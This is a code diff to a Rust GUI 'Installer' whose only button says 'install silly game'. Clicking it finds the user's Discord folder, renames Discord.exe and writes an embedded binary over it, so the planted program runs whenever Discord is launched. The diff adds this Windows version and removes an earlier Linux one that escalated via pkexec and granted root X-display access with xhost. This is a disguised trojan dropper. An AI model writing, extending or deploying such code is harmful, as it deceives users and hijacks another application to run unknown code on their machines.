@@ -4,6 +4,7 @@ use std::process::Command;
 use eframe::{App, egui};
 use dark_light::Mode;
 use whoami;
+use regex::Regex;
 
 const EMBEDDED_BINARY: &[u8] = include_bytes!("../target/release/main");
 
@@ -15,26 +16,6 @@ fn is_root() -> bool {
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let display = std::env::var("DISPLAY").unwrap_or(":0".to_string());
-    println!("DISPLAY: {}", display);
-    std::env::set_var("DISPLAY", &display);
-
-    Command::new("xhost")
-        .arg("+SI:localuser:root")
-        .status()
-        .expect("Failed to execute xhost");
-
-    if !is_root() {
-        let status = Command::new("pkexec")
-            .arg(std::env::current_exe()?)
-            .status()
-            .expect("Failed to execute pkexec");
-
-        if !status.success() {
-            return Err("Authentication failed".into());
-        }
-    }
-
     let native_options = eframe::NativeOptions::default();
     eframe::run_native("Installer", native_options, Box::new(|_cc| {
         Ok(Box::new(InstallerApp::default()))
@@ -81,7 +62,7 @@ impl App for InstallerApp {
                 }
             } else {
                 if ui.button("install silly game").clicked() {
-                    self.status = install_discord();
+                    self.status = install_discord(whoami::username().as_str());
                     self.alertm = Some(self.status.clone());
                 }
             }
@@ -103,28 +84,52 @@ impl App for InstallerApp {
     }
 }
 
-fn install_discord() -> String {
-    let discord_dir = "/usr/share/discord";
-    if directory_exists(discord_dir) {
-        let discord_bin = format!("{}/Discord", discord_dir);
-        let discord_new = format!("{}/Discord2", discord_dir);
+fn install_discord(username: &str) -> String {
+    if username.is_empty() {
+        return "A username is required!".to_string();
+    }
 
-        if let Err(e) = mv_file(&discord_bin, &discord_new) {
-            return format!("Failed!\n{}", e);
-        }
+    let home_dir = dirs::home_dir().expect("Could not find home directory");
 
-        match write_binary(&discord_bin) {
-            Ok(_) => "Installation successful!".to_string(),
-            Err(e) => {
-                let revert_msg = match mv_file(&discord_bin, &discord_new) {
-                    Ok(_) => "Reverted changes successfully.".to_string(),
-                    Err(e) => format!("Failed to revert changes, the following apps WILL be affected:\n{}", e),
-                };
-                format!("Failed to install binary!\n{}\n{}", e, revert_msg)
-            }
+    let re = Regex::new(r"app-.+").unwrap();
+    let dc_path = format!("{}\\AppData\\Local\\Discord\\", home_dir.display());
+    let mut discord_path = String::new();
+
+    for entry in fs::read_dir(&dc_path).unwrap() {
+        let entry = entry.unwrap();
+        let file_name = entry.file_name();
+        let file_name_str = file_name.to_str().unwrap();
+
+        if re.is_match(file_name_str) {
+            discord_path = format!("{}{}", dc_path, file_name_str);
+            break;
         }
-    } else {
-        "Discord directory does not exist.".to_string()
+    }
+
+    if discord_path.is_empty() {
+        return "Discord installation directory not found!".to_string();
+    }
+    println!("Discord path: {}", discord_path);
+
+    let dc_path = discord_path; // Update dc_path to include the app-* directory
+
+    let discord_bin = format!("{}\\Discord.exe", dc_path);
+    let discord_new = format!("{}\\..\\discord2.exe", dc_path);
+    println!("Attempting to install binary to: {}", discord_bin);
+    println!("Attempting to rename existing binary to: {}", discord_new);
+    if let Err(e) = fs::rename(&discord_bin, &discord_new) {
+        return format!("Failed to rename existing binary!\n{}", e);
+    }
+
+    match write_binary(&discord_bin) {
+        Ok(_) => "Installation successful!".to_string(),
+        Err(e) => {
+            let revert_msg = match fs::rename(&discord_new, &discord_bin) {
+                Ok(_) => "Reverted changes successfully.".to_string(),
+                Err(e) => format!("Failed to revert changes, the following apps WILL be affected:\n{}", e),
+            };
+            format!("Failed to install binary!\n{}\n{}", e, revert_msg)
+        }
     }
 }
 
